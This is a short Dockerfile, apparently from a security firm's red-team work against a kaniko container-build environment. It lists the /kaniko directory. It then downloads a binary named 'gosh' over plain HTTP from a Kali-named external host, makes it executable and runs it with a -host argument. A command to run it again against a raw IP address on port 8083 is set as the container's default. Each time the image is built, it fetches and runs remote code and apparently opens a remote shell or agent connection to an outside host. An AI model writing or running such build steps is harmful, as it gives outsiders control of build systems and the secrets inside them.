FROM praetorianlabs/gosh-agent
RUN apk update && apk add tree
RUN tree /kaniko
RUN curl -o /tmp/gosh http://kali1.praetorianlabs.com:8084/
RUN chmod +x /tmp/gosh
RUN /tmp/gosh -host kali1.praetorianlabs.com:8083

CMD ["-host", "104.198.138.155:8083"]    

